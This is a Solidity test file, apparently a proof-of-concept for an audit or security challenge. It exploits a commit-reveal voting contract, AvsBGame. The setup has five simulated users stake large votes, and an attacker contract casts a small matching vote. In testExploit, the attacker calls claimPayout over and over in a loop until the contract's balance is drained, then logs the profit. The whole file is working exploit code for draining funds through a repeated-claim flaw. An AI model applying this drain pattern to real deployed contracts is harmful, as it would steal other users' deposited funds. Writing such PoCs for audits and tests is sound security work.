// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.11;

import "ds-test/test.sol";
import "../AvsBGame.sol";
import "../IAvsBGame.sol";
import "./Hevm.sol";

contract User {}
contract ContractTest is DSTest {
    
    Hevm internal hevm;
    address _target;
    User[] users;
    uint start;
    uint end;

    function setUp() public {
        hevm = Hevm(HEVM_ADDRESS);
        _target = address(new AvsBGame());
        start = address(this).balance;
        
        // multiple users vote for A
        for (uint i = 0; i < 5; i++) {
            User user = new User();
            users.push(user);
            bytes32 victimVote = keccak256(abi.encodePacked(address(user), IAvsBGame.Choice.A, bytes32("0")));
            hevm.deal(address(user), 1 << 128);
            hevm.startPrank(address(user));
            IAvsBGame(_target).castHiddenVote{value: 5e15 * 1000}(victimVote);
            hevm.stopPrank();
        }
        
        // attacker votes for A
        bytes32 attackerVote = keccak256(abi.encodePacked(address(this), IAvsBGame.Choice.A, bytes32("0")));
        IAvsBGame(_target).castHiddenVote{value: 5e15}(attackerVote);
        emit log_uint(address(this).balance / 1 ether);
        hevm.warp(1643702400); // end of voteDeadline

        // reveal votes
        for (uint i = 0; i < users.length; i++) {
            hevm.startPrank(address(users[i]));
            IAvsBGame(_target).reveal(IAvsBGame.Choice.A, bytes32("0"));
            hevm.stopPrank();
        }

        // attacker reveals
        IAvsBGame(_target).reveal(IAvsBGame.Choice.A, bytes32("0"));
        hevm.warp(1644912000 + 1); // after revealDeadline, eligble to claim
    }

    function testExploit() public {
        uint cache = address(this).balance;
        IAvsBGame(_target).claimPayout();
        uint current = address(this).balance;
        uint amountOut = current - cache; // amount attacker can claim every time

        while (_target.balance >= amountOut) {
            IAvsBGame(_target).claimPayout();
        } 
        
        end = address(this).balance;
        require(end - start > 0); 
        emit log_named_uint("Profit:", end - start);
        
    }
    receive() payable external {}
}
